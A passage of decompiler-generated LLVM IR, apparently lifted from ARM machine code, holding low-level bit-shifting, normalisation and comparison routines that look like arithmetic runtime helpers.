dec_label_pc_34708:                               ; preds = %dec_label_pc_346d4, %dec_label_pc_346ec
  %storemerge = phi i32 [ %v11_346e4, %dec_label_pc_346d4 ], [ %v8_34704, %dec_label_pc_346ec ]
  %v0_34708 = phi i32 [ %v11_346e4, %dec_label_pc_346d4 ], [ %v8_34704, %dec_label_pc_346ec ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_34708 = and i32 %v0_34708, -2147483648
  store i32 %v1_34708, i32* @r5, align 4
  %v1_3470c = icmp sgt i32 %v0_34708, -1
  call void @__pseudo_cond_branch(i1 %v1_3470c, i32 ptrtoint (i32* @global_var_3471c.2236 to i32))
  %v0_34710 = load i32, i32* %ip.global-to-local, align 4
  %v1_34710 = sub i32 0, %v0_34710
  store i32 %v1_34710, i32* %ip.global-to-local, align 4
  %v2_34710 = icmp eq i32 %v0_34710, 0
  %v0_34714 = load i32, i32* %r0.global-to-local, align 4
  %v2_34714 = icmp eq i1 %v2_34710, false
  %v5_34714 = sext i1 %v2_34714 to i32
  %v6_34714 = sub i32 %v5_34714, %v0_34714
  store i32 %v6_34714, i32* %r0.global-to-local, align 4
  %v7_34714 = zext i1 %v2_34714 to i32
  %v8_34714 = icmp ne i32 %v6_34714, %v7_34714
  %v9_34714 = icmp ne i32 %v0_34714, -1
  %v10_34714 = or i1 %v9_34714, %v8_34714
  %v11_34714 = icmp ne i32 %v0_34714, 0
  %v12_34714 = select i1 %v2_34714, i1 %v10_34714, i1 %v11_34714
  %v0_34718 = load i32, i32* %r1.global-to-local, align 4
  %v5_34718 = sext i1 %v12_34714 to i32
  %v6_34718 = sub i32 %v5_34718, %v0_34718
  store i32 %v6_34718, i32* @r1, align 4
  ret i32 %v6_34714

; uselistorder directives
  uselistorder i1 %v2_34714, { 1, 2, 0 }
  uselistorder i32 %v0_34714, { 1, 2, 0 }
  uselistorder i32 %v8_34704, { 1, 0 }
  uselistorder i32 %v0_346f8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_346e4, { 1, 0 }
  uselistorder i32 %v1_346e0, { 1, 0, 2 }
  uselistorder i32 %v0_346d8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_34708, { 1, 0 }
}

define i32 @function_3471c(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_3471c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_3471c = load i32, i32* %r1.global-to-local, align 4
  %v3_34720 = icmp ult i32 %v0_3471c, 1048574
  br i1 %v3_34720, label %dec_label_pc_34764, label %dec_label_pc_34724

dec_label_pc_34724:                               ; preds = %dec_label_pc_3471c
  %v3_34728 = icmp ult i32 %v0_3471c, 2097150
  br i1 %v3_34728, label %dec_label_pc_34748, label %dec_label_pc_3472c

dec_label_pc_3472c:                               ; preds = %dec_label_pc_34724
  %v1_3472c = urem i32 %v0_3471c, 2
  %v2_3472c = icmp ne i32 %v1_3472c, 0
  %v3_3472c = udiv i32 %v0_3471c, 2
  store i32 %v3_3472c, i32* %r1.global-to-local, align 4
  %v0_34730 = load i32, i32* %r0.global-to-local, align 4
  %v3_34730 = zext i1 %v2_3472c to i32
  %v6_34730 = zext i32 %v0_34730 to i64
  %v7_34730 = sub i32 33, %v0_34730
  %v8_34730 = zext i32 %v7_34730 to i64
  %v9_34730 = shl i64 %v6_34730, %v8_34730
  %v10_34730 = sub i32 32, %v0_34730
  %v11_34730 = shl i32 %v3_34730, %v10_34730
  %v12_34730 = zext i32 %v11_34730 to i64
  %v14_34730 = or i64 %v12_34730, %v9_34730
  %v15_34730 = trunc i64 %v14_34730 to i32
  %v16_34730 = add i32 %v0_34730, -1
  %v17_34730 = shl i32 1, %v16_34730
  %v18_34730 = and i32 %v17_34730, %v0_34730
  %v19_34730 = icmp ne i32 %v18_34730, 0
  store i32 %v15_34730, i32* %r0.global-to-local, align 4
  %v0_34734 = load i32, i32* @ip, align 4
  %v3_34734 = zext i1 %v19_34730 to i32
  %v6_34734 = zext i32 %v0_34734 to i64
  %v7_34734 = sub i32 33, %v0_34734
  %v8_34734 = zext i32 %v7_34734 to i64
  %v9_34734 = shl i64 %v6_34734, %v8_34734
  %v10_34734 = sub i32 32, %v0_34734
  %v11_34734 = shl i32 %v3_34734, %v10_34734
  %v12_34734 = zext i32 %v11_34734 to i64
  %v14_34734 = or i64 %v12_34734, %v9_34734
  %v15_34734 = trunc i64 %v14_34734 to i32
  store i32 %v15_34734, i32* @ip, align 4
  %v0_34738 = load i32, i32* @r4, align 4
  %v1_34738 = add i32 %v0_34738, 1
  store i32 %v1_34738, i32* @r4, align 4
  %v3_3473c = mul i32 %v1_34738, 2097152
  %v2_34740 = icmp ugt i32 %v3_3473c, -4194305
  call void @__pseudo_cond_branch(i1 %v2_34740, i32 ptrtoint (i32* @global_var_348f8.2237 to i32))
  br label %dec_label_pc_34748

dec_label_pc_34748:                               ; preds = %dec_label_pc_34764, %dec_label_pc_34724, %dec_label_pc_3472c
  %v0_34748 = load i32, i32* @ip, align 4
  %v2_34748 = icmp slt i32 %v0_34748, 0
  %v6_34748 = icmp eq i32 %v0_34748, -2147483648
  %v1_3474c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_34748, label %bb, label %dec_label_pc_34748._crit_edge

bb:                                               ; preds = %dec_label_pc_34748
  %v2_3474c = urem i32 %v1_3474c, 2
  %v3_3474c = icmp ne i32 %v2_3474c, 0
  br label %dec_label_pc_34748._crit_edge

dec_label_pc_34748._crit_edge:                    ; preds = %dec_label_pc_34748, %bb
  %v1_34750 = phi i1 [ %v3_3474c, %bb ], [ %v2_34748, %dec_label_pc_34748 ]
  %v2_34750 = zext i1 %v1_34750 to i32
  %v3_34750 = add i32 %v2_34750, %v1_3474c
  store i32 %v3_34750, i32* %r0.global-to-local, align 4
  %v0_34754 = load i32, i32* %r1.global-to-local, align 4
  %v1_34754 = load i32, i32* @r4, align 4
  %v2_34754 = and i32 %v1_34754, 4096
  %v3_34754 = icmp ne i32 %v2_34754, 0
  %v4_34754 = mul i32 %v1_34754, 1048576
  %v6_34754 = add i32 %v4_34754, %v0_34754
  %v7_34754 = zext i1 %v3_34754 to i32
  %v8_34754 = add i32 %v7_34754, %v6_34754
  %v1_34758 = load i32, i32* @r5, align 4
  %v2_34758 = or i32 %v1_34758, %v8_34754
  store i32 %v2_34758, i32* %r1.global-to-local, align 4
  ret i32 %v3_34750

dec_label_pc_34764:                               ; preds = %dec_label_pc_3471c
  %v0_34764 = load i32, i32* @ip, align 4
  %v1_34764 = icmp slt i32 %v0_34764, 0
  %v2_34764 = mul i32 %v0_34764, 2
  store i32 %v2_34764, i32* @ip, align 4
  %v0_34768 = load i32, i32* %r0.global-to-local, align 4
  %v3_34768 = mul i32 %v0_34768, 2
  %v4_34768 = zext i1 %v1_34764 to i32
  %v5_34768 = or i32 %v3_34768, %v4_34768
  store i32 %v5_34768, i32* %r0.global-to-local, align 4
  %v9_34768 = icmp ule i32 %v5_34768, %v0_34768
  %v10_34768 = icmp ult i32 %v3_34768, %v0_34768
  %v11_34768 = select i1 %v1_34764, i1 %v9_34768, i1 %v10_34768
  %v3_3476c = mul i32 %v0_3471c, 2
  %v4_3476c = zext i1 %v11_34768 to i32
  %v5_3476c = or i32 %v4_3476c, %v3_3476c
  store i32 %v5_3476c, i32* %r1.global-to-local, align 4
  %v1_34770 = and i32 %v3_3476c, 1048576
  %v2_34770 = icmp eq i32 %v1_34770, 0
  %v0_34774 = load i32, i32* @r4, align 4
  %v1_34774 = add i32 %v0_34774, -1
  store i32 %v1_34774, i32* @r4, align 4
  br i1 %v2_34770, label %bb7, label %dec_label_pc_34748

bb7:                                              ; preds = %dec_label_pc_34764
  ret i32 %v5_34768

; uselistorder directives
  uselistorder i32 %v0_34768, { 1, 2, 0 }
  uselistorder i1 %v1_34764, { 1, 0 }
  uselistorder i32 %v1_3474c, { 1, 0 }
  uselistorder i32 %v0_34748, { 1, 0 }
  uselistorder i32 %v0_34734, { 1, 0, 2 }
  uselistorder i32 %v0_34730, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_34748._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_34748, { 0, 2, 1 }
}

define i32 @function_3477c() local_unnamed_addr {
dec_label_pc_3477c:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_3477c = load i32, i32* @r1, align 4
  %v2_3477c = icmp eq i32 %v0_3477c, 0
  br i1 %v2_3477c, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_3477c
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_3477c
  %v1_3478810 = load i32, i32* @r0, align 4
  store i32 %v1_3478810, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_347e4 = phi i32 [ %v0_3477c, %bb ], [ %v1_3478810, %bb38 ]
  %v1_3479c = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_34794 = icmp ugt i32 %v0_347e4, 65535
  br i1 %v2_34794, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_34798 = and i32 %v0_347e4, 32768
  %v3_34798 = icmp eq i32 %v2_34798, 0
  %v4_34798 = udiv i32 %v0_347e4, 65536
  br i1 %v3_34798, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_3479c = add nsw i32 %v1_3479c, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_347a8 = phi i32 [ %v1_3479c, %.thread ], [ %v1_3479c, %bb39 ], [ %v2_3479c, %bb40 ]
  %v1_347a4 = phi i32 [ %v0_347e4, %.thread ], [ %v4_34798, %bb39 ], [ %v4_34798, %bb40 ]
  %v2_347a0 = icmp ugt i32 %v1_347a4, 255
  br i1 %v2_347a0, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_347a4 = and i32 %v1_347a4, 128
  %v3_347a4 = icmp eq i32 %v2_347a4, 0
  %v4_347a4 = udiv i32 %v1_347a4, 256
  br i1 %v3_347a4, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_347a8 = add nsw i32 %v1_347a8, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_347b4 = phi i32 [ %v1_347a8, %.thread3 ], [ %v1_347a8, %bb41 ], [ %v2_347a8, %bb42 ]
  %v1_347b0 = phi i32 [ %v1_347a4, %.thread3 ], [ %v4_347a4, %bb41 ], [ %v4_347a4, %bb42 ]
  %v2_347ac = icmp ugt i32 %v1_347b0, 15
  br i1 %v2_347ac, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_347b0 = and i32 %v1_347b0, 8
  %v3_347b0 = icmp eq i32 %v2_347b0, 0
  %v4_347b0 = udiv i32 %v1_347b0, 16
  br i1 %v3_347b0, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_347b4 = add nsw i32 %v1_347b4, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_347bc = phi i32 [ %v1_347b4, %.thread4 ], [ %v1_347b4, %bb43 ], [ %v2_347b4, %bb44 ]
  %v1_347c4 = phi i32 [ %v1_347b0, %.thread4 ], [ %v4_347b0, %bb43 ], [ %v4_347b0, %bb44 ]
  %v2_347b8 = icmp ugt i32 %v1_347c4, 3
  br i1 %v2_347b8, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_347bc = add i32 %v1_347bc, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_347c0 = udiv i32 %v1_347c4, 2
  %v6_347c0 = sub i32 %v1_347bc, %v5_347c0
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_347c4 = phi i32 [ %v6_347c0, %.thread6 ], [ %v2_347bc, %bb45 ]
  %v4_347c4 = udiv i32 %v1_347c4, 8
  %v5_347c4 = sub i32 %v0_347c4, %v4_347c4
  %v2_347c8 = add i32 %v5_347c4, -32
  %v4_347c8 = sub i32 31, %v5_347c4
  %v5_347c8 = and i32 %v4_347c8, %v5_347c4
  %v8_347c8 = icmp eq i32 %v5_347c4, 32
  %v6_347cc = icmp slt i32 %v5_347c4, 32
  br i1 %v6_347cc, label %dec_label_pc_347d0, label %dec_label_pc_347f0

dec_label_pc_347d0:                               ; preds = %bb46
  %v2_347d0 = add i32 %v5_347c4, -20
  %v7_347d4 = icmp sgt i32 %v2_347c8, -12
  br i1 %v7_347d4, label %dec_label_pc_347d8, label %dec_label_pc_347ec

dec_label_pc_347d8:                               ; preds = %dec_label_pc_347d0
  %v1_347dc = sub i32 32, %v5_347c4
  %v6_347e0 = shl i32 %v0_347e4, %v5_347c4
  store i32 %v6_347e0, i32* @r0, align 4
  %v6_347e4 = lshr i32 %v0_347e4, %v1_347dc
  store i32 %v6_347e4, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_347ec:                               ; preds = %dec_label_pc_347d0
  %v8_347d0 = icmp eq i32 %v2_347d0, 0
  %v4_347d0 = add i32 %v5_347c4, 2147483616
  %v5_347d0 = and i32 %v2_347d0, %v4_347d0
  br label %dec_label_pc_347f0

dec_label_pc_347f0:                               ; preds = %bb46, %dec_label_pc_347ec
  %v1_347fc.in = phi i32 [ %v2_347c8, %bb46 ], [ %v2_347d0, %dec_label_pc_347ec ]
  %v6_347fc = phi i32 [ %v2_347c8, %bb46 ], [ %v5_347c4, %dec_label_pc_347ec ]
  %v2_347fc.in = phi i32 [ %v5_347c8, %bb46 ], [ %v5_347d0, %dec_label_pc_347ec ]
  %v0_347fc = phi i1 [ %v8_347c8, %bb46 ], [ %v8_347d0, %dec_label_pc_347ec ]
  %v1_347fc = icmp slt i32 %v1_347fc.in, 0
  %v2_347fc = icmp slt i32 %v2_347fc.in, 0
  %v3_347f0 = xor i1 %v2_347fc, %v1_347fc
  %v4_347f0 = or i1 %v0_347fc, %v3_347f0
  br i1 %v4_347f0, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_347f0
  %v6_347f0 = sub i32 32, %v6_347fc
  store i32 %v6_347f0, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_347f0, %bb47
  %v6_347f4 = shl i32 %v0_347e4, %v6_347fc
  store i32 %v6_347f4, i32* %r1.global-to-local, align 4
  br i1 %v4_347f0, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_347f8 = load i32, i32* @r0, align 4
  %v7_347f8 = load i32, i32* @ip, align 4
  %v12_347f8 = lshr i32 %v6_347f8, %v7_347f8
  %v13_347f8 = or i32 %v12_347f8, %v6_347f4
  store i32 %v13_347f8, i32* %r1.global-to-local, align 4
  %v11_347fc = shl i32 %v6_347f8, %v6_347fc
  store i32 %v11_347fc, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_347d8, %bb49
  %v6_34804 = phi i32 [ %v6_347e4, %dec_label_pc_347d8 ], [ %v13_347f8, %bb49 ], [ %v6_347f4, %bb48 ]
  %v0_34800 = load i32, i32* @r4, align 4
  %v2_34800 = sub i32 %v0_34800, %v5_347c4
  store i32 %v2_34800, i32* %r4.global-to-local, align 4
  %v4_34800 = xor i32 %v0_34800, %v5_347c4
  %v5_34800 = xor i32 %v2_34800, %v0_34800
  %v6_34800 = and i32 %v5_34800, %v4_34800
  %v7_34800 = icmp slt i32 %v6_34800, 0
  %v8_34800 = icmp slt i32 %v2_34800, 0
  %v5_34804 = icmp slt i32 %v0_34800, %v5_347c4
  br i1 %v5_34804, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_34804 = mul i32 %v2_34800, 1048576
  %v11_34804 = add i32 %v10_34804, %v6_34804
  %v7_34808 = load i32, i32* @r5, align 4
  %v8_34808 = or i32 %v7_34808, %v11_34804
  store i32 %v8_34808, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_34810 = xor i1 %v8_34800, %v7_34800
  %v4_34810 = xor i1 %v3_34810, true
  call void @__pseudo_cond_branch(i1 %v4_34810, i32 %tmp33)
  %v0_34814 = load i32, i32* %r4.global-to-local, align 4
  %v2_34818 = sub i32 -32, %v0_34814
  store i32 %v2_34818, i32* %r4.global-to-local, align 4
  %v6_3481c = icmp sgt i32 %v0_34814, -32
  br i1 %v6_3481c, label %dec_label_pc_34820, label %dec_label_pc_34860

dec_label_pc_34820:                               ; preds = %.thread8
  %v1_34820 = add i32 %v2_34818, 12
  store i32 %v1_34820, i32* %r4.global-to-local, align 4
  %v8_34824 = icmp sgt i32 %v1_34820, 0
  br i1 %v8_34824, label %dec_label_pc_34844, label %dec_label_pc_34828

dec_label_pc_34828:                               ; preds = %dec_label_pc_34820
  %v1_34828 = add i32 %v2_34818, 32
  %v1_3482c = sub i32 0, %v2_34818
  %v0_34830 = load i32, i32* @r0, align 4
  %v6_34830 = lshr i32 %v0_34830, %v1_34828
  %v1_34834 = load i32, i32* %r1.global-to-local, align 4
  %v7_34834 = shl i32 %v1_34834, %v1_3482c
  %v8_34834 = or i32 %v7_34834, %v6_34830
  %v0_34838 = load i32, i32* @r5, align 4
  %v7_34838 = lshr i32 %v1_34834, %v1_34828
  %v8_34838 = or i32 %v0_34838, %v7_34838
  store i32 %v8_34838, i32* %r1.global-to-local, align 4
  %v2_3483c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_3483c, i32* %r4.global-to-local, align 4
  ret i32 %v8_34834

dec_label_pc_34844:                               ; preds = %dec_label_pc_34820
  %v1_34844 = sub i32 0, %v2_34818
  %v1_34848 = add i32 %v2_34818, 32
  %v0_3484c = load i32, i32* @r0, align 4
  %v6_3484c = lshr i32 %v0_3484c, %v1_34848
  %v1_34850 = load i32, i32* %r1.global-to-local, align 4
  %v7_34850 = shl i32 %v1_34850, %v1_34844
  %v8_34850 = or i32 %v7_34850, %v6_3484c
  %v0_34854 = load i32, i32* @r5, align 4
  store i32 %v0_34854, i32* %r1.global-to-local, align 4
  %v2_34858 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_34858, i32* %r4.global-to-local, align 4
  ret i32 %v8_34850

dec_label_pc_34860:                               ; preds = %.thread8
  %v0_34860 = load i32, i32* %r1.global-to-local, align 4
  %v6_34860 = lshr i32 %v0_34860, %v2_34818
  %v0_34864 = load i32, i32* @r5, align 4
  store i32 %v0_34864, i32* %r1.global-to-local, align 4
  %v2_34868 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_34868, i32* %r4.global-to-local, align 4
  ret i32 %v6_34860

; uselistorder directives
  uselistorder i32 %v2_34818, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_34800, { 1, 2, 0, 3 }
  uselistorder i32 %v0_34800, { 2, 0, 1, 3 }
  uselistorder i32 %v6_347f4, { 1, 0, 2 }
  uselistorder i32 %v2_347c8, { 1, 0, 2 }
  uselistorder i32 %v5_347c4, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_347b0, { 1, 0 }
  uselistorder i32 %v1_347b0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_347a4, { 1, 0 }
  uselistorder i32 %v1_347a4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_34798, { 1, 0 }
  uselistorder i32 %v0_347e4, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 2, 7, 3, 8, 4, 5, 6, 10, 0 }
  uselistorder i32 -12, { 3, 1, 2, 4, 13, 14, 5, 16, 17, 6, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 23, 7, 24, 25, 26, 0 }
  uselistorder i32 -20, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 -2, { 11, 12, 13, 3, 5, 6, 4, 14, 15, 16, 0, 7, 10, 9, 17, 29, 24, 26, 27, 28, 8, 23, 1, 19, 18, 25, 2, 20, 21, 22 }
  uselistorder i32 -4, { 12, 52, 53, 54, 13, 14, 15, 16, 67, 68, 55, 17, 69, 18, 26, 80, 81, 82, 7, 27, 28, 29, 83, 84, 85, 8, 30, 31, 32, 86, 87, 88, 9, 33, 34, 89, 25, 24, 90, 91, 92, 23, 22, 21, 20, 35, 36, 37, 38, 39, 6, 40, 4, 41, 5, 93, 19, 42, 56, 57, 58, 59, 43, 44, 95, 97, 98, 10, 99, 100, 96, 45, 94, 2, 46, 61, 62, 63, 64, 65, 66, 0, 1, 73, 74, 75, 76, 77, 78, 79, 47, 70, 71, 72, 11, 60, 48, 3, 49, 50, 51 }
  uselistorder i32 15, { 12, 4, 0, 13, 14, 15, 16, 1, 22, 2, 23, 21, 5, 20, 19, 3, 17, 18, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 -8, { 37, 67, 76, 38, 1, 73, 74, 75, 45, 46, 47, 48, 49, 50, 44, 43, 35, 42, 41, 40, 39, 51, 52, 53, 54, 55, 78, 84, 56, 57, 58, 59, 60, 79, 82, 61, 83, 68, 69, 70, 71, 72, 65, 62, 63, 64, 2, 80, 81, 36, 33, 34, 77, 66, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 128, { 43, 10, 11, 8, 9, 29, 49, 12, 48, 0, 1, 52, 2, 30, 31, 50, 53, 54, 3, 4, 32, 55, 5, 46, 33, 51, 44, 45, 47, 6, 34, 7, 14, 13, 16, 15, 35, 36, 18, 17, 20, 19, 37, 38, 22, 21, 24, 23, 39, 40, 26, 25, 28, 27, 41, 42 }
  uselistorder i32 255, { 44, 6, 7, 59, 47, 8, 48, 0, 1, 2, 5, 4, 49, 9, 60, 45, 46, 10, 11, 12, 13, 50, 14, 51, 15, 52, 16, 17, 18, 19, 20, 53, 54, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 55, 40, 56, 57, 41, 58, 42, 43, 3 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22, 23 }
  uselistorder i32 65536, { 1, 2, 4, 3, 5, 8, 6, 9, 7, 10, 11, 12, 14, 13, 15, 16, 17, 18, 20, 19, 25, 21, 26, 22, 27, 23, 28, 24, 29, 30, 31, 35, 32, 36, 33, 37, 34, 38, 40, 39, 41, 127, 126, 125, 128, 42, 43, 44, 0, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 59, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 72, 71, 75, 74, 73, 76, 77, 79, 78, 80, 82, 81, 84, 83, 85, 88, 87, 86, 89, 93, 90, 94, 91, 95, 92, 96, 98, 97, 99, 101, 100, 103, 102, 106, 104, 108, 109, 107, 105, 112, 110, 114, 113, 111, 115, 117, 116, 118, 120, 119, 123, 121, 124, 122 }
  uselistorder i32 32768, { 4, 0, 3, 1, 2, 7, 5, 6 }
  uselistorder i32 65535, { 7, 0, 2, 3, 8, 9, 4, 5, 6, 1 }
  uselistorder i32 52, { 1, 11, 36, 12, 29, 18, 19, 13, 27, 28, 42, 40, 6, 41, 0, 38, 39, 14, 15, 17, 35, 31, 30, 21, 37, 20, 32, 33, 25, 7, 16, 26, 2, 22, 4, 23, 3, 24, 8, 9, 10, 5, 34 }
  uselistorder i32 20, { 6, 146, 147, 68, 65, 66, 67, 69, 70, 71, 32, 148, 136, 137, 14, 149, 33, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 150, 11, 60, 34, 35, 12, 138, 1, 151, 139, 140, 72, 73, 74, 75, 118, 3, 8, 76, 77, 78, 79, 80, 81, 159, 15, 160, 161, 4, 162, 143, 36, 152, 153, 133, 134, 135, 82, 37, 83, 84, 2, 164, 141, 142, 158, 61, 5, 7, 154, 155, 156, 157, 85, 144, 97, 163, 86, 165, 166, 87, 88, 89, 90, 91, 92, 93, 38, 39, 62, 119, 120, 121, 122, 94, 145, 95, 167, 168, 96, 98, 63, 0, 64, 99, 100, 101, 102, 103, 104, 10, 105, 106, 107, 108, 40, 17, 16, 41, 109, 42, 43, 19, 18, 44, 110, 45, 46, 20, 21, 111, 112, 113, 22, 23, 114, 115, 116, 24, 25, 117, 26, 27, 123, 124, 125, 9, 29, 28, 126, 127, 128, 31, 30, 129, 130, 131, 132, 13, 47 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_347f0, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_34870(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_34870:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_34870 = load i32, i32* @r4, align 4
  %v2_34870 = icmp eq i32 %v0_34870, 0
  %v1_34874 = xor i32 %arg3, 1048576
  store i32 %v1_34874, i32* @r3, align 4
  br i1 %v2_34870, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_34870
  %v1_34878 = load i32, i32* @r1, align 4
  %v2_34878 = xor i32 %v1_34878, 1048576
  store i32 %v2_34878, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_34870
  %v1_34880 = load i32, i32* @r5, align 4
  %v2_34880 = add i32 %v1_34880, -1
  store i32 %v2_34880, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_34884 = call i32 @function_346c8()
  store i32 %v0_34884, i32* %r0.global-to-local, align 4
  %v0_34888 = load i32, i32* @r4, align 4
  %v0_34888.off = add i32 %v0_34888, 4194303
  %tmp = icmp ult i32 %v0_34888.off, 2097152
  %v1_34918 = load i32, i32* @r5, align 4
  %v1_34918.off = add i32 %v1_34918, 4194303
  %tmp44 = icmp ult i32 %v1_34918.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_34894

dec_label_pc_34894:                               ; preds = %bb30
  %v4_34894 = icmp eq i32 %v1_34918, %v0_34888
  br i1 %v4_34894, label %bb31, label %dec_label_pc_348a0

bb31:                                             ; preds = %dec_label_pc_34894
  %v2_34898 = load i32, i32* @r2, align 4
  %v5_34898 = icmp eq i32 %v2_34898, %v0_34884
  br i1 %v5_34898, label %dec_label_pc_348b4, label %dec_label_pc_348a0

dec_label_pc_348a0:                               ; preds = %dec_label_pc_34894, %bb31
  %v2_348a0 = or i32 %v0_34888, %v0_34884
  %v4_348a0 = icmp eq i32 %v2_348a0, 0
  br i1 %v4_348a0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_348a0
  %v1_348a8 = load i32, i32* @r2, align 4
  store i32 %v1_348a8, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_348a0, %bb32
  %v1_348b0 = phi i32 [ %v0_34884, %dec_label_pc_348a0 ], [ %v1_348a8, %bb32 ]
  ret i32 %v1_348b0

dec_label_pc_348b4:                               ; preds = %bb31
  %v0_348b4 = load i32, i32* @r1, align 4
  %v1_348b4 = load i32, i32* @r3, align 4
  %v4_348b4 = icmp eq i32 %v1_348b4, %v0_348b4
  br i1 %v4_348b4, label %dec_label_pc_348b4..thread8_crit_edge, label %bb33

dec_label_pc_348b4..thread8_crit_edge:            ; preds = %dec_label_pc_348b4
  %v0_348c4.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_348b4
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_348b4..thread8_crit_edge, %bb33
  %v0_348c4 = phi i32 [ %v0_348c4.pre, %dec_label_pc_348b4..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_348c4 = xor i1 %v4_348b4, true
  call void @__pseudo_cond_branch(i1 %v2_348c4, i32 %v0_348c4)
  %v0_348c8 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_348c8, 2097152
  br i1 %tmp45, label %dec_label_pc_348d0, label %dec_label_pc_348e4

dec_label_pc_348d0:                               ; preds = %.thread8
  %v0_348d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_348d0 = icmp slt i32 %v0_348d0, 0
  %v2_348d0 = mul i32 %v0_348d0, 2
  store i32 %v2_348d0, i32* %r0.global-to-local, align 4
